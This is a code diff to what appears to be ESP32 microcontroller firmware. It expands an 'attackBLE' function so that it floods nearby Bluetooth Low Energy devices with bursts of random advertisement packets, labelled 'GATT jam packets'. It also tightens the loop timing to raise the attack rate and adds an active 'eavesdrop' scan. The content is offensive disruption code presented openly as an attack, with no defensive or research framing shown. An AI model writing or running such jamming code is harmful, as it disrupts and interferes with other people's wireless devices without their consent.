@@ -23,28 +23,41 @@ AttackResult attackBLE(uint32_t durationMs, const String &method) {
 
     BLEDevice::init("");
     BLEScan* pBLEScan = BLEDevice::getScan();
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
 
     g_attackActive = true;
     g_attackCount = 0;
     uint32_t startTime = millis();
+    uint32_t deadline = startTime + durationMs;
 
-    while (millis() - startTime < durationMs && g_attackActive) {
+    while ((int32_t)(millis() - deadline) < 0 && g_attackActive) {
         if (method == "GATT" || method == "ALL") {
-            // GATT service disruption
+            // GATT service disruption - send GATT jam packets
             uint8_t gattJam[20];
             for (int i = 0; i < 20; i++) {
                 gattJam[i] = (esp_random() % 256);
+            }
+
+            BLEAdvertisementData advData;
+            advData.setFlags(0x06);
+            advData.addData(std::string((const char*)gattJam, 20));
+
+            if (pAdvertising) {
+                pAdvertising->setAdvertisementData(advData);
+                pAdvertising->start();
+                delayMicroseconds(100);
+                pAdvertising->stop();
             }
             g_attackCount++;
         }
 
         if (method == "EAVES" || method == "ALL") {
-            // Eavesdrop on BLE traffic
-            pBLEScan->start(0, false);
+            // Eavesdrop on BLE traffic - active scan to detect devices
+            pBLEScan->start(1, false);  // Scan for 1 second
             g_attackCount++;
         }
 
-        delay(100);
+        delayMicroseconds(500);
 
         if (g_attackCount % 50 == 0) {
             Serial.println("  [" + String(g_attackCount) + "] attack packets");
